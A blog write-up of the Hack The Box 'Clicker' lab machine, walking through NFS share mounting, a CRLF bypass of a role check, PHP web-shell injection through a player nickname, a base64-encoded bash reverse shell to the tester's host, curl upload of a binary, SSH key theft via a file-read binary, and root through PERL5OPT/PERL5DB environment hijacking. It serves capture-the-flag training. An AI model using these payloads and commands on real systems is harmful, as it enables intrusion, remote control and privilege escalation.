---
title:  "HTB Clicker Writeup"
date:   2024-01-27 00:30:00 
categories: HTB writeup
tags: Binary_exploitation Web Source_code Environment_hijacking
---



![Clicker box card](/assets/img/Clicker/1695303008085.jpg)

## Introduction

Clicker was an interesting application where you could find some source code on an open NFS share. During my years as a penetration tester i've found many open NFS shares present within corporate environments with often sensitive information. Then after getting the source code it was a mix of common web vulnerabilities and carefully reading the source code. 

For root it was an interesting approach where you could hijack the environment of a perl script. I hope you enjoy the write-up

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.


## Initial access
### Recon

To start our recon off we will start with an Nmap scan of the machine. using the following command
```
sudo nmap -sS -A  -o nmap  10.10.11.232
```

**Nmap**
```
# Nmap 7.94 scan initiated Sat Nov  4 08:27:12 2023 as: nmap -sS -A -o nmap 10.10.11.232
Nmap scan report for 10.10.11.232
Host is up (0.026s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://clicker.htb/
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      43641/udp   mountd
|   100005  1,2,3      48811/udp6  mountd
|   100005  1,2,3      52619/tcp   mountd
|   100005  1,2,3      57971/tcp6  mountd
|   100021  1,3,4      33281/udp6  nlockmgr
|   100021  1,3,4      36301/udp   nlockmgr
|   100021  1,3,4      38555/tcp6  nlockmgr
|   100021  1,3,4      42147/tcp   nlockmgr
|   100024  1          33150/udp   status
|   100024  1          36147/udp6  status
|   100024  1          49901/tcp   status
|   100024  1          55939/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=11/4%OT=22%CT=1%CU=36223%PV=Y%DS=2%DC=T%G=Y%TM=654638B
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   30.73 ms 10.10.14.1
2   25.08 ms 10.10.11.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  4 08:27:35 2023 -- 1 IP address (1 host up) scanned in 23.92 seconds
```

Looking at the NMAP results we can see there aren't a lot of ports open. There is SSH HTTP RPC and NFS. the first thing that comes to mind whenever i see NFS is can i mount whatever it is exposing. So thats what we will do first. you can show what folders are being exposed by  doing the showmount command
```
showmount -e 10.10.11.232
```
![Mountable directories](/assets/img/Clicker/Clicker_01.png)

Here we could see that the **/mnt/backups** directory is mountable by anyone without any restrictions You can mount the directory with the following command.

```
sudo mount -t nfs 10.10.11.232:/mnt/backups ./nfsshare
```

After mounting the NFS share we could see there was a zip file named **clicker.htb_backup.zip** present.

![Backup found](/assets/img/Clicker/Clicker_02.png)

Next we unzipped the archive and we ended up what looked like the source code of some application.

![Files](/assets/img/Clicker/Clicker_03.png)


 now that we have the code i went to check if the source code that i see matches the active application on port 80. The source code matched the application which allowed us to have a deeper understanding on what the application is doing. Looking through the applications source code of the **save_game.php** file it seemed odd to me that there was a specific check if the **role** parameter is being supplied or not. However this check is quite easy to bypass by using a character that doesn't destroy the functionality but still alters the key name.
```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
	
}
?>
```

So i tried to bypass this by adding a CRLF character at the end of the key. The php code should still interpret this as the original value but it won't match the string search anymore. this will then end up with the following key to add onto the save request
```
role%0a=admin
```

We send the following request
```
GET /save_game.php?clicks=24&level=0&role%0a=Admin HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=t7nav29pjbsd0omvf7edup7bac
Upgrade-Insecure-Requests: 1
```

The server would then redirect us and in the next request we can see we didn't get the error message meaning our message went through
```
GET /index.php?msg=Game%20has%20been%20saved! HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://clicker.htb/save_game.php?clicks=24&level=0&role%0a=Admin
Cookie: PHPSESSID=t7nav29pjbsd0omvf7edup7bac
Upgrade-Insecure-Requests: 1
```
Then we needed to log out and back in and the administration page would be visible

![Adminstrative access](/assets/img/Clicker/Clicker_04.png)

### Adminstrative access

When opening the administrative page we noticed there was a export functionality that looked very odd. The request allowed us to chose the extension. i decided to try exporting all the data using a PHP extension with the following request.

```
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://clicker.htb
Connection: close
Referer: http://clicker.htb/admin.php?msg=Data%20has%20been%20saved%20in%20exports/top_players_xbv0g6zl.txt
Cookie: PHPSESSID=t7nav29pjbsd0omvf7edup7bac
Upgrade-Insecure-Requests: 1

threshold=1000000&extension=php
```

The server then accepted our request and would send the following response telling us our data is saved in **exports/top_players_1hnxigl2.**

```
HTTP/1.1 302 Found
Date: Sat, 04 Nov 2023 15:03:40 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /admin.php?msg=Data has been saved in exports/top_players_1hnxigl2.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

When browsing to that page we could see that it indeed render the page as if it was PHP. If we now are able to get some php code in there we would be able to get remote code execution.

![Exported users](/assets/img/Clicker/Clicker_05.png)

So now that we know that we can make it output php pages the next step is to actually get PHP code in there. For this i looked deeper into the export code

```php
<?php
session_start();
include_once("db_utils.php");

if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}

function random_string($length) {
    $key = '';
    $keys = array_merge(range(0, 9), range('a', 'z'));

    for ($i = 0; $i < $length; $i++) {
        $key .= $keys[array_rand($keys)];
    }

    return $key;
}

$threshold = 1000000;
if (isset($_POST["threshold"]) && is_numeric($_POST["threshold"])) {
    $threshold = $_POST["threshold"];
}
$data = get_top_players($threshold);
$currentplayer = get_current_player($_SESSION["PLAYER"]);
$s = "";
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
} elseif ($_POST["extension"] == "json") {
  $s .= json_encode($currentplayer);
  $s .= json_encode($data);
} else {
  $s .= '<table>';
  $s .= '<thead>';
  $s .= '  <tr>';
  $s .= '    <th scope="col">Nickname</th>';
  $s .= '    <th scope="col">Clicks</th>';
  $s .= '    <th scope="col">Level</th>';
  $s .= '  </tr>';
  $s .= '</thead>';
  $s .= '<tbody>';
  $s .= '  <tr>';
  $s .= '    <th scope="row">' . $currentplayer["nickname"] . '</th>';
  $s .= '    <td>' . $currentplayer["clicks"] . '</td>';
  $s .= '    <td>' . $currentplayer["level"] . '</td>';
  $s .= '  </tr>';

  foreach ($data as $player) {
    $s .= '  <tr>';
    $s .= '    <th scope="row">' . $player["nickname"] . '</th>';
    $s .= '    <td>' . $player["clicks"] . '</td>'; 
    $s .= '    <td>' . $player["level"] . '</td>';
    $s .= '  </tr>';
  }
  $s .= '</tbody>';
  $s .= '</table>';
} 

$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
file_put_contents($filename, $s);
header('Location: /admin.php?msg=Data has been saved in ' . $filename);
?>
```
The next part of this code looks very interesting it mentions a nickname which was not used anywhere else before.
```php
  foreach ($data as $player) {
    $s .= '  <tr>';
    $s .= '    <th scope="row">' . $player["nickname"] . '</th>';
    $s .= '    <td>' . $player["clicks"] . '</td>'; 
    $s .= '    <td>' . $player["level"] . '</td>';
    $s .= '  </tr>';
  }
```

Based on this we can probably inject PHP code into the nickname the same way we did for adding administrative privileges to our account. make sure you add a large amount of clicks as well so you're for sure in the top players. As a payload i'm just going to use a very basic command interpreter in php.
```
<?php system($_GET['cmd']) ?>
```
Seeing we are going to be using this in a URL i URL encoded all the characters we needed making us end up with the following command.
```
<%3fphp+system($_GET['cmd'])+%3f>
```
Next we send the following request to make us end up with a high ranking player with our payload in the nickname

```
GET /save_game.php?clicks=999999999999999999&level=600&role%0a=Admin&&nickname=<%3fphp+system($_GET['cmd'])+%3f> HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=t7nav29pjbsd0omvf7edup7bac
Upgrade-Insecure-Requests: 1
```

Then after we added this nickname generate a new export with the following request
```
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://clicker.htb
Connection: close
Referer: http://clicker.htb/admin.php?msg=Data%20has%20been%20saved%20in%20exports/top_players_xbv0g6zl.txt
Cookie: PHPSESSID=t7nav29pjbsd0omvf7edup7bac
Upgrade-Insecure-Requests: 1

threshold=1&extension=php
```

The server then issued the following valid response giving us the URL we would find our export.

```
HTTP/1.1 302 Found
Date: Sat, 04 Nov 2023 15:27:36 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /admin.php?msg=Data has been saved in exports/top_players_gt0ln37v.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

We could test that our commands were working by browsing to the following URL
```
http://clicker.htb/exports/top_players_gt0ln37v.php?cmd=id
```

![Code execution](/assets/img/Clicker/Clicker_06.png)

Now that we have code execution lets upgrade this further to a full on reverse shell. I usually prefer b64 encoding my shells because this causes less syntax issues. we use the following shell command.

```
echo -n '/bin/bash -l > /dev/tcp/10.10.14.53/443 0<&1 2>&1' | base64

```

this command gave us the following B64 encoded string 
```
L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDA8JjEgMj4mMQ==
```

Then using this B64 string our payload will look like this:

```
echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDA8JjEgMj4mMQ== | base64 --decode | bash
```

Because we will be using this payload in a URL its best to URL encode all the spaces as well leaving us with the following resulting payload

```
echo%20L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDA8JjEgMj4mMQ==|%20base64%20--decode|%20bash

```

This resulted us with the following url 
```
http://clicker.htb/exports/top_players_0q3k1hvj.php?cmd=echo%20L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDA8JjEgMj4mMQ==|%20base64%20--decode|%20bash
```

going to that url gave us a reverse shell

![Reverse shell](/assets/img/Clicker/Clicker_07.png)

## Lateral Movement



So after gaining the reverse shell i started enumerating the system and found a custom binary in **/opt/manage** that we are able to run that is owned by a user called jack. this binary looked interesting so i decided to take the binary from the system.

![Binary in opt](/assets/img/Clicker/Clicker_08.png)

I setup an upload server using python using the upload server module
```
python3 -m uploadserver 80
```
Next use the following curl command to upload the binary

```
curl -X POST http://10.10.14.53/upload -F files=@execute_query
```

After opening the binary in ghidra i was able to get the following source code: 

```c
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  undefined8 uVar2;
  char *pcVar3;
  size_t sVar4;
  size_t sVar5;
  char *__dest;
  long in_FS_OFFSET;
  undefined8 local_98;
  undefined8 local_90;
  undefined4 local_88;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar2 = 1;
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = (char *)calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
    local_98 = 0x616a2f656d6f682f;
    local_90 = 0x69726575712f6b63;
    local_88 = 0x2f7365;
    sVar4 = strlen((char *)&local_98);
    sVar5 = strlen(pcVar3);
    __dest = (char *)calloc(sVar5 + sVar4 + 1,1);
    strcat(__dest,(char *)&local_98);
    strcat(__dest,pcVar3);
    setreuid(1000,1000);
    iVar1 = access(__dest,4);
    if (iVar1 == 0) {
      local_78 = 0x6e69622f7273752f;
      local_70 = 0x2d206c7173796d2f;
      local_68 = 0x656b63696c632075;
      local_60 = 0x6573755f62645f72;
      local_58 = 0x737361702d2d2072;
      local_50 = 0x6c63273d64726f77;
      local_48 = 0x62645f72656b6369;
      local_40 = 0x726f77737361705f;
      local_38 = 0x6b63696c63202764;
      local_30 = 0x203c20762d207265;
      local_28 = 0;
      sVar4 = strlen((char *)&local_78);
      sVar5 = strlen(pcVar3);
      pcVar3 = (char *)calloc(sVar5 + sVar4 + 1,1);
      strcat(pcVar3,(char *)&local_78);
      strcat(pcVar3,__dest);
      system(pcVar3);
    }
    else {
      puts("File not readable or not found");
    }
    uVar2 = 0;
  }
LAB_001015e1:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

The code is pretty odd because there is a default function that only runs when you use something that doesn't exist. Basically it will try to read a file you supply it with. it also sets the userid to 1000. next i checked the  passwd file to see which user this was.

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

So seeing that user 1000 was jack this means that this script could read any file that jack has access too. i then tried to extract the SSH key using the following command.

```
./execute_query 6 ../.ssh/id_rsa
```

![Binary in opt](/assets/img/Clicker/Clicker_09.png)


Now that we have the SSH key we can log in usign it 
```
ssh -i id_rsa jack@clicker.htb
```
## Privilege Escalation

Then after logging in i ran **Sudo -l** as a sanity check and we could run the following  tje /opt/monitor.sh script with sudo


![Can run script as root](/assets/img/Clicker/Clicker_10.png)

First up we checked the contents of the script you're allowed to run.
```
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```
 At a first glance i didn't see anything really exploitable at first. hen i looked deeper into the **/usr/bin/xml_pp**. below the code that 

```
#!/usr/bin/perl -w
# $Id: /xmltwig/trunk/tools/xml_pp/xml_pp 32 2008-01-18T13:11:52.128782Z mrodrigu  $
use strict;

use XML::Twig;
use File::Temp qw/tempfile/;
use File::Basename qw/dirname/;

my @styles= XML::Twig->_pretty_print_styles; # from XML::Twig
my $styles= join '|', @styles;               # for usage
my %styles= map { $_ => 1} @styles;          # to check option

my $DEFAULT_STYLE= 'indented';

my $USAGE= "usage: $0 [-v] [-i<extension>] [-s ($styles)] [-p <tag(s)>] [-e <encoding>] [-l] [-f <file>] [<files>]";

# because of the -i.bak option I don't think I can use one of the core
# option processing modules, so it's custom handling and no clusterization :--(


my %opt= process_options(); # changes @ARGV

my @twig_options=( pretty_print  => $opt{style},
                   error_context => 1,
                 );
if( $opt{preserve_space_in})
  { push @twig_options, keep_spaces_in => $opt{preserve_space_in};}

<SNIPPED FOR BREVITY>
```

Long time ago i read that some perl scripts could be vulnerable to perl_startup vulnerabilities by abusing the parameters given to them. A good example of this is the following metasploit module [Metaploit module EXIM ](https://www.exploit-db.com/exploits/39702). In our case it isn't EXIM but the same vulnerability was present here. We could execute commands as root by putting them in **PERL5OPT** and **PERL5DB** variables which we pass when running the script.

As payload i added the SUID bit to this bash 

```
sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /tmp/.hidden/bash"' /opt/monitor.sh
```
![Exploit](/assets/img/Clicker/Clicker_11.png)


Then after we could get a root shell by running `

```
bash -p
```
![Root shell obtained](/assets/img/Clicker/Clicker_12.png)

